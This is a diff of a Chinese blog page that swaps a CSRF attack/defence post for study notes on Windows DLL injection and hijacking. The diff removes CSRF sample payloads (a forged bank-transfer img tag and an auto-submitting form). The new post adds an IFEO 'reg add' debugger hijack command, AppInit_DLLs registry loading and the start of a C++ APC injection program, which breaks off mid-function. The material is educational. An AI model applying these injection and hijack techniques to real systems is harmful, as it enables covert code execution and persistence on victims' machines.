@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>CSRF攻击防御/Hackbar攻击原理及Flask防御策略研究 – ruokeqx&#39;s blog</title>
+    <title>DLL注入及DLL劫持简单学习 – ruokeqx&#39;s blog</title>
     
 
 
@@ -653,7 +653,7 @@
     
     var baseurl = JSON.parse("\"https://ruokeqx.gitee.io\"");
     
-    var permalink = JSON.parse("\"https://ruokeqx.gitee.io/posts/csrfad/\"");
+    var permalink = JSON.parse("\"https://ruokeqx.gitee.io/posts/dll_injection_and_dll_hijacking/\"");
     
     var langprefix = JSON.parse("\"\"");
     var searchResults = null;
@@ -1334,18 +1334,18 @@
 <meta name="description" content="" />
 
 
-<meta name="keywords" content="web,csrf">
+<meta name="keywords" content="red team,windows">
 
-<meta name="created" content="2022-01-21T00:00:00&#43;0000">
-<meta name="modified" content="2022-01-21T00:00:00&#43;0000">
-<meta property="article:published_time" content="2022-01-21T00:00:00&#43;0000">
+<meta name="created" content="2022-01-22T00:00:00&#43;0000">
+<meta name="modified" content="2022-01-22T00:00:00&#43;0000">
+<meta property="article:published_time" content="2022-01-22T00:00:00&#43;0000">
 
 <meta name="author" content="ruokeqx">
 
 
 <meta property="og:site_name" content="ruokeqx&#39;s blog">
-<meta property="og:title" content="CSRF攻击防御/Hackbar攻击原理及Flask防御策略研究">
-<meta property="og:url" content="https://ruokeqx.gitee.io/posts/csrfad/">
+<meta property="og:title" content="DLL注入及DLL劫持简单学习">
+<meta property="og:url" content="https://ruokeqx.gitee.io/posts/dll_injection_and_dll_hijacking/">
 <meta property="og:type" content="article">
 <meta property="og:description" content="">
 
@@ -1358,7 +1358,7 @@
 
 <meta name="apple-mobile-web-app-status-bar-style" content="#fff">
 
-<link rel="canonical" href="https://ruokeqx.gitee.io/posts/csrfad/">
+<link rel="canonical" href="https://ruokeqx.gitee.io/posts/dll_injection_and_dll_hijacking/">
 
 <link rel="manifest" href="/manifest.json">
 
@@ -1372,12 +1372,12 @@
   {
     "@context": "https://schema.org",
     "@type": "WebPage",
-    "headline": "CSRF攻击防御/Hackbar攻击原理及Flask防御策略研究",
-    "datePublished": "2022-01-21T00:00:00Z",
-    "dateModified": "2022-01-21T00:00:00Z",
-    "url" : "https://ruokeqx.gitee.io/posts/csrfad/",
-    "description": "前言 CSRF的防护主要思想就是保证请求是从正确的网站发出的。 CSRF攻击 攻击原理图如下，图片来自[1] GET型攻击 get型攻击仅需伪造一次g",
-    "keywords": ["web","csrf"],
+    "headline": "DLL注入及DLL劫持简单学习",
+    "datePublished": "2022-01-22T00:00:00Z",
+    "dateModified": "2022-01-22T00:00:00Z",
+    "url" : "https://ruokeqx.gitee.io/posts/dll_injection_and_dll_hijacking/",
+    "description": "static library and dynamic library 静态库空间浪费 静态库对程序的更新、部署和发布页会带来麻烦 动态库在程序编译时并不会被连接到目标代码中，而是在程序运行是才被载入。不同",
+    "keywords": ["red team","windows"],
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https://ruokeqx.gitee.io"
@@ -1696,7 +1696,7 @@
   
   <li  class="is-active" >
     
-      <span>CSRF攻击防御/Hackbar攻击原理及Flask防御策略研究</span>
+      <span>DLL注入及DLL劫持简单学习</span>
     
   </li>
   
@@ -1708,14 +1708,14 @@
   <div class="single ">
     <div class="single__nojs">This page looks best with JavaScript enabled</div>
     <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
-    <h2 class="single__title" data-ani="true">CSRF攻击防御/Hackbar攻击原理及Flask防御策略研究</h2>
+    <h2 class="single__title" data-ani="true">DLL注入及DLL劫持简单学习</h2>
     <h3 class="single__subtitle"></h3>
     <div class="single__meta">
       
 <div class="single__infos">
-  <time class="single__info" title="Written At">📅&nbsp;Jan 21, 2022 </time>
+  <time class="single__info" title="Written At">📅&nbsp;Jan 22, 2022 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;4&nbsp;min read </span>
+  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;12&nbsp;min read </span>
   
   <span class="single__info">
      &middot; 👀<span id="busuanzi_value_page_pv">...</span> views
@@ -1728,85 +1728,105 @@
   🏷️
   
 
-  <li><a href="https://ruokeqx.gitee.io/tags/web/" class="single__tag" title="web">#web</a></li>
+  <li><a href="https://ruokeqx.gitee.io/tags/red-team/" class="single__tag" title="red team">#red team</a></li>
 
-  <li><a href="https://ruokeqx.gitee.io/tags/csrf/" class="single__tag" title="csrf">#csrf</a></li>
+  <li><a href="https://ruokeqx.gitee.io/tags/windows/" class="single__tag" title="windows">#windows</a></li>
 
 </ul>
 
     </div>
     <article class="single__contents" data-dir="ltr" data-ani="true">
       
-      <h2 id="前言">前言</h2>
-<p>CSRF的防护主要思想就是保证请求是从正确的网站发出的。</p>
-<h2 id="csrf攻击">CSRF攻击</h2>
-<p>攻击原理图如下，图片来自[1]</p>
-<p><img src="/images/posts/CSRFA&amp;D/image-20220121021425315.png" alt="CSRF攻击原理" /></p>
-<h3 id="get型攻击">GET型攻击</h3>
-<p>get型攻击仅需伪造一次get请求即可，危害程度大</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span><span class="p">&gt;</span>
-</code></pre></td></tr></table>
-</div>
-</div><h3 id="post型攻击">POST型攻击</h3>
+      <h2 id="static-library-and-dynamic-library">static library and dynamic library</h2>
+<p>静态库空间浪费<br />
+静态库对程序的更新、部署和发布页会带来麻烦</p>
+<p>动态库在程序编译时并不会被连接到目标代码中，而是在程序运行是才被载入。不同的应用程序如果调用相同的库，那么在内存里只需要有一份该共享库的实例，规避了空间浪费问题。</p>
+<ul>
+<li>
+<p>在Windows系统下的执行文件格式是PE格式，动态库需要一个DllMain函数做出初始化的入口，导出 extern &ldquo;C&rdquo; _declspec(dllexport) 导入 extern &ldquo;C&rdquo; _declspec(dllimport)</p>
+</li>
+<li>
+<p>Linux下gcc编译的执行文件默认是ELF格式，不需要初始化入口，亦不需要函数做特别的声明，编写比较方便。</p>
+</li>
+</ul>
+<p>静态库对应的lib文件叫静态库，动态库对应的lib文件叫导入库。实际上静态库本身就包含了实际执行代码、符号表等等，而对于导入库而言，其实际的执行代码位于动态库中，导入库只包含了地址符号表等，确保程序找到对应函数的一些基本地址信息。</p>
+<p>Linux 静态链接库</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">http://wooyun.org/csrf.php</span> <span class="na">method</span><span class="o">=</span><span class="s">POST</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;xx&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;11&#34;</span> <span class="p">/&gt;</span>
-<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span> <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span> 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># gen StaticMath.o</span>
+g++ -c StaticMath.cpp
+<span class="c1"># gen libstaticmath.a</span>
+ar -crv libstaticmath.a StaticMath.o
+<span class="c1"># use libstaticmath.a</span>
+g++ TestStaticLibrary.cpp -L../StaticLibrary -lstaticmath
+g++ TestStaticLibrary.cpp ../StaticLibrary/libstaticmath.a
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="csrf检测">CSRF检测</h2>
-<h3 id="csrftester">CSRFTester</h3>
-<p>源码阅读：入口类为CSRFTester，构造函数创建UI，main中创建proxy，Proxy(new Framework()).run()</p>
-<h2 id="csrf防御">CSRF防御</h2>
-<h3 id="referer">referer</h3>
-<p>网站B发出的请求referer为网站B，只需在后端判断referer是否同站即可防御CSRF。这样相当于把安全寄托于第三方，因为浏览器都不支持js对referer头的修改[4]&amp;[5]，有的文章[6]说可以使用axios进行referer绕过，但是我测试后并不行。</p>
-<pre tabindex="0"><code>Refused to set unsafe header &quot;referer&quot;
-</code></pre><p>js不允许修改referer头，但是hackbar可以添加任意头，是如何实现的呢。</p>
-<h4 id="hackbar源码阅读">Hackbar源码阅读</h4>
-<p>文件系统中搜索chrome插件id就很容易找到解包后源码的位置，可以发现连Hackbar都是大名鼎鼎的vue写的。</p>
-<p>搜索referer可以在index.js中看到commonRequestHeaders的函数列出常见的request头</p>
-<p>发现主要逻辑如下，就是通过v-model动态绑定vue对象data数据中headers中的值</p>
+</div><p>Windows 静态链接库</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-vue" data-lang="vue">
-<span class="p">&lt;</span><span class="nt">v-btn</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;add-header-button&#34;</span> <span class="nt">@click</span><span class="s">=&#34;addHeader()&#34;</span><span class="p">&gt;</span><span class="na">Add</span> <span class="na">Header</span><span class="err">&lt;/</span><span class="nt">v-btn</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">v-layout</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;header-settings&#34;</span> <span class="na">align</span><span class="nt">-center</span> <span class="nt">v-for</span><span class="s">=&#34;(header, index) in request.headers&#34; </span><span class="nt">:key</span><span class="s">=&#34;index&#34;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">v-checkbox</span> <span class="nt">v-model</span><span class="s">=&#34;header.enabled&#34;</span><span class="p">&gt;</span><span class="err">&lt;/</span><span class="nt">v-checkbox</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">v-combobox</span> <span class="na">dense</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;px-1 pt-2&#34;</span> <span class="na">label</span><span class="o">=</span><span class="s">&#34;Name&#34;</span> <span class="nt">v-model</span><span class="s">=&#34;header.name&#34; :items=&#34;commonRequestHeaders()&#34; @focus=&#34;onFocus($event)&#34; :menu-props=&#39;{ &#34;maxHeight&#34;: 200 }&#39;&gt;&lt;/v-combobox&gt;
-</span><span class="s">    &lt;v-text-field class=&#34;px-1&#34; label=&#34;Value&#34; v-model=&#34;header.value&#34; @focus=&#34;onFocus($event)&#34; @keydown.stop&gt;&lt;/v-text-field&gt;
-</span><span class="s">    &lt;v-btn icon text @click=&#34;deleteHeader(index)&#34;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">v-icon</span> <span class="na">small</span><span class="p">&gt;</span><span class="nx">mdi</span><span class="o">-</span><span class="nx">close</span><span class="o">&lt;</span><span class="err">/v-icon&gt;</span>
-    <span class="o">&lt;</span><span class="err">/v-btn&gt;</span>
-<span class="o">&lt;</span><span class="err">/v-layout&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># gen StaticMath.obj</span>
+<span class="n">cl</span> <span class="p">/</span><span class="n">c</span> <span class="n">StaticMath</span><span class="p">.</span><span class="nb">cpp
+</span><span class="nb"></span><span class="c"># gen StaticMath.lib</span>
+<span class="n">lib</span> <span class="n">StaticMath</span><span class="p">.</span><span class="n">obj</span>
+<span class="c"># 属性配置-&gt;常规-&gt;配置类型-&gt;应用程序(.exe)/动态库(.dll)/静态库(.lib)</span>
+<span class="c"># use StaticMath.lib</span>
+<span class="c"># 引用</span>
+<span class="c"># 属性配置-&gt;链接器-&gt;[(常规-&gt;附加库目录)&amp;(输入-&gt;附加依赖项目)] or (命令行-&gt;添加完整路径)</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>headers只是存储数据，执行时调用<code>chrome.runtime.connect()</code>这个接口，他的第一个参数是extension id。</p>
-<p>The ID of the extension or app to connect to. If omitted, a connection will be attempted with your own extension. Required if sending messages from a web page for web messaging.[7]</p>
+</div><p>Linux 动态链接库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># -fPIC(position independent code) -shared 共享库</span>
+g++ -fPIC -shared -o libdynmath.so DynamicMath.cpp
+<span class="c1"># use libdynmath.so</span>
+edit /etc/ld.so.conf.d/
+<span class="c1">## or</span>
+sudo cp libdynmath.so /usr/lib
+g++ TestDynamicLibrary.cpp -L../DynamicLibrary -ldynmath
+</code></pre></td></tr></table>
+</div>
+</div><p>Windows 动态链接库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&#34;DynamicMath.h&#34;</span><span class="cp">
+</span><span class="cp"></span><span class="n">DynamicMath</span><span class="o">::</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>显式调用</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1824,56 +1844,272 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-vue" data-lang="vue"><span class="k">this</span><span class="p">.</span><span class="nx">backgroundPageConnection</span> <span class="o">=</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">connect</span><span class="p">()</span>
-<span class="p">...</span>
-<span class="nx">execute</span><span class="o">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">return</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># linux</span>
+<span class="c1">#include &lt;dlfcn.h&gt;</span>
+void * dlopen<span class="o">(</span> const char * pathname, int mode <span class="o">)</span>
+void* dlsym<span class="o">(</span>void* handle,const char* symbol<span class="o">)</span>	<span class="c1"># 函数地址及变量地址</span>
+int dlclose <span class="o">(</span>void *handle<span class="o">)</span>
+
+<span class="c1"># win</span>
+<span class="c1">#LoadLibrary加载DLL、GetProcAddress获取导出函数的函数指针、用完FreeLibrary</span>
+HMODULE <span class="nv">hMod</span> <span class="o">=</span> LoadLibrary<span class="o">(</span>DLL路径<span class="o">)</span>
+
+typedef int<span class="o">(</span>*ADD_IMPORT<span class="o">)</span> <span class="o">(</span>int a,int b<span class="o">)</span><span class="p">;</span>
+ADD_IMPORT <span class="nv">add_proc</span> <span class="o">=</span> <span class="o">(</span>ADD_IMPORT<span class="o">)</span> GetProcAddress<span class="o">(</span>hMod,<span class="s2">&#34;Add&#34;</span><span class="o">)</span><span class="p">;</span>
+int <span class="nv">result</span> <span class="o">=</span> add_proc<span class="o">(</span>1,2<span class="o">)</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>因为C++的name mangling，用extern &ldquo;C&quot;声明[非成员]函数 使用函数名作符号名</p>
+<h2 id="dll-injection">Dll injection</h2>
+<p>dll注入即是让程序A强行加载程序B给定的a.dll，并执行程序B给定的a.dll里面的代码。</p>
+<p>应用程序一般会在以下情况使用dll注入技术来完成某些功能：<br />
+1.为目标进程添加新的“实用”功能；<br />
+2.需要一些手段来辅助调试被注入dll的进程；<br />
+3.为目标进程安装钩子程序(API Hook)；</p>
+<p>注入dll的原则是值在需要的时间才注入我们的dll，并在不需要时及时卸载。</p>
+<p>Injecting DLL with remote thread context patching</p>
+<h3 id="注册表">注册表</h3>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</p>
+<p>中AppInit_DLLs键的值可以是一个dll的文件名或一组dll的文件名(通过逗号或空格来分隔)</p>
+<p>LoadAppInit_DLLs为1时表示AppInit_DLLs键有效</p>
+<p>这两个键值设定后，当应用程序启动并加载User32.dll时，会获得上述注册表键的值，并调用LoadLibrary来调用这些字符串中指定的每一个dll。这时每个被载入的dll可以完成相应的初始化工作。但是需要注意的是，由于被注入的dll是在进程生命期的早期被载入的，因此这些dll在调用函数时应慎重。调用Kernel32.dll中的函数应该没有问题，因为Kernel32.dll是在User32.dll载入前已被加载。但是调用其他的dll中的函数时应当注意，因为进程可能还未载入相应的dll，严重时可能会导致蓝屏。</p>
+<h3 id="image-hijack">Image hijack</h3>
+<p>Image File Execution Options子项的Debugger选项会在对应程序被点击执行时调用对应程序为调试器，但是如果是正常程序就相当被劫持了。再次运行notepad.exe会跳出计算器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">reg</span> <span class="n">add</span> <span class="s2">&#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">Debugger</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">calc</span><span class="p">.</span><span class="n">exe</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>执行需要管理员权限，执行时杀软都会报毒</p>
+<p><img src="/images/posts/dll_injection_and_dll_hijacking/image_hijack.png" alt="image hijack" /></p>
+<p>至于<a href="https://www.anquanke.com/post/id/151425#h2-3">新型利用</a> 中说的新静默关闭启动监视器的劫持方式无论在win10还是win7中都没有复现成功</p>
+<p>调试器可以在被调试进程中执行很多特殊操作，操作系统载入一个被调试程序的时候，会在被调试的主线程尚未开始执行任何代码前，自动通知调试器(用来调试被调试进程的进程)，这时调试器可以将一些代码注入到被调试进程的地址空间中，保存被调试进程的CONTEXT结构，修改EIP指向我们注入的代码的起始位置执行这些代码。最后再让被调试的进程恢复原来的CONTEXT，继续执行。整个过程对被调试的进程而言好像没发生任何事情。</p>
+<h3 id="apc-injection">APC injection</h3>
+<p>APC(Asynchronous Procedure Call) 注入原理</p>
+<p>1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断。<br />
+2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。<br />
+3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</p>
+<p>首先需要一个被注入的程序，调用SleepEx使其挂起</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">DWORD</span> <span class="nf">SleepEx</span><span class="p">(</span>	<span class="c1">// synchapi.h
+</span><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span> <span class="n">dwMilliseconds</span><span class="p">,</span>	<span class="c1">// 毫秒数
+</span><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">BOOL</span>  <span class="n">bAlertable</span>			<span class="c1">// FALSE，则函数在超时期限过后才返回 True 会在超时时间已过或调用APC函数时返回
+</span><span class="c1"></span><span class="p">);</span>
+<span class="err">挂起当前线程，直到满足指定条件。当发生以下情况之一时，执行恢复：</span>
+<span class="mf">1.</span><span class="err">调用</span> <span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="err">完成回调函数。</span>
+<span class="mf">2.</span><span class="err">异步过程调用</span> <span class="p">(</span><span class="n">APC</span><span class="p">)</span> <span class="err">排队到线程。</span>
+<span class="mf">3.</span><span class="err">超时间隔已过。</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">DWORD</span> <span class="nf">QueueUserAPC</span><span class="p">(</span>	<span class="c1">// processthreadsapi.h
+</span><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">PAPCFUNC</span>  <span class="n">pfnAPC</span><span class="p">,</span>	<span class="c1">// 待执行的函数指针
+</span><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HANDLE</span>    <span class="n">hThread</span><span class="p">,</span>	<span class="c1">// A handle to the thread. The handle must have the THREAD_SET_CONTEXT access right.
+</span><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">ULONG_PTR</span> <span class="n">dwData</span>		<span class="c1">// 传递给执行函数的单个参数
+</span><span class="c1"></span><span class="p">);</span>
+<span class="err">将用户模式</span><span class="n">APC对象添加到指定线程的APC队列中</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&#34;stdafx.h&#34;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
+</span><span class="cp">#include</span><span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span><span class="cpf">&lt;shlwapi.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span><span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span><span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
+</span><span class="cp">#pragma comment(lib,&#34;shlwapi.lib&#34;)
+</span><span class="cp">#pragma comment(lib,&#34;ntdll.lib&#34;)
+</span><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+<span class="c1">//根据进程名获取PID
+</span><span class="c1"></span><span class="n">DWORD</span> <span class="nf">GetPidFormName</span><span class="p">(</span><span class="n">wstring</span> <span class="n">wsProcessname</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">HANDLE</span> <span class="n">hSnaoshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hSnaoshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">PROCESSENTRY32W</span> <span class="n">pe</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pe</span><span class="p">)</span> <span class="p">};</span>
+    <span class="n">BOOL</span> <span class="n">bok</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">bok</span> <span class="o">=</span> <span class="n">Process32FirstW</span><span class="p">(</span><span class="n">hSnaoshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">);</span> <span class="n">bok</span><span class="p">;</span> <span class="n">bok</span> <span class="o">=</span> <span class="n">Process32NextW</span><span class="p">(</span><span class="n">hSnaoshot</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pe</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">wstring</span> <span class="n">wsNowProcName</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">StrStrI</span><span class="p">(</span><span class="n">wsNowProcName</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">wsProcessname</span><span class="p">.</span><span class="n">c_str</span><span class="p">())</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnaoshot</span><span class="p">);</span>
+            <span class="k">return</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnaoshot</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">//dll 文件注入到进程wsProcessname
+</span><span class="c1"></span><span class="n">BOOL</span> <span class="nf">Injection_APC</span><span class="p">(</span><span class="k">const</span> <span class="n">wstring</span> <span class="o">&amp;</span><span class="n">wsProcessname</span><span class="p">,</span> <span class="k">const</span> <span class="n">WCHAR</span> <span class="n">wcCacheInDllPath</span><span class="p">[])</span>
